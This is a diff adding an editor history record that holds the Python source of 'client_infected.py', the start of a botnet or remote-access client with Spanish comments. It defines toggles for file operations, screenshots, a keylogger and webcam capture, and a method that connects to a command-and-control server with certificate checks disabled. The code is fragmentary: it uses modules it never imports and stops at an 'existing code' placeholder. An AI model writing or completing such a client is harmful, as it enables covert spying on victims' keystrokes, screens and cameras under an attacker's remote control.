@@ -1,0 +1,18 @@
+{
+    "sourceFile": "src/client_infected.py",
+    "activeCommit": 0,
+    "commits": [
+        {
+            "activePatchIndex": 0,
+            "patches": [
+                {
+                    "date": 1740311454867,
+                    "content": "Index: \n===================================================================\n--- \n+++ \n"
+                }
+            ],
+            "date": 1740311454867,
+            "name": "Commit-0",
+            "content": "import configparser\r\nimport os\r\n\r\ndef cargar_configuracion():\r\n    \"\"\"Carga la configuración del cliente.\"\"\"\r\n    config = configparser.ConfigParser()\r\n    config.read(os.path.join(os.path.dirname(__file__), \"..\", \"config\", \"config.ini\"))\r\n    return config\r\n\r\nclass BotClient:\r\n    def __init__(self):\r\n        self.config = cargar_configuracion()\r\n        self.features = {\r\n            \"file_ops\": self.config.getboolean(\"FEATURES\", \"ENABLE_FILE_OPERATIONS\", fallback=True),\r\n            \"screenshots\": self.config.getboolean(\"FEATURES\", \"ENABLE_SCREENSHOTS\", fallback=True),\r\n            \"keylogger\": self.config.getboolean(\"FEATURES\", \"ENABLE_KEYLOGGER\", fallback=False),\r\n            \"webcam\": self.config.getboolean(\"FEATURES\", \"ENABLE_WEBCAM\", fallback=False)\r\n        }\r\n        \r\n        # Configurar conexión SSL si está habilitada\r\n        self.use_ssl = self.config.getboolean(\"SECURITY\", \"ENABLE_SSL\", fallback=False)\r\n        if self.use_ssl:\r\n            self.ssl_context = ssl.create_default_context()\r\n            self.ssl_context.check_hostname = False\r\n            self.ssl_context.verify_mode = ssl.CERT_NONE\r\n            \r\n    def connect(self):\r\n        \"\"\"Conecta al servidor C&C.\"\"\"\r\n        host = self.config.get(\"NETWORK\", \"HOST\")\r\n        port = self.config.getint(\"NETWORK\", \"PORT\")\r\n        timeout = self.config.getint(\"NETWORK\", \"TIMEOUT\", fallback=30)\r\n        \r\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n        if self.use_ssl:\r\n            sock = self.ssl_context.wrap_socket(sock)\r\n        \r\n        sock.settimeout(timeout)\r\n        sock.connect((host, port))\r\n        return sock\r\n        \r\n    # ...existing code...\r\n"
+        }
+    ]
+}
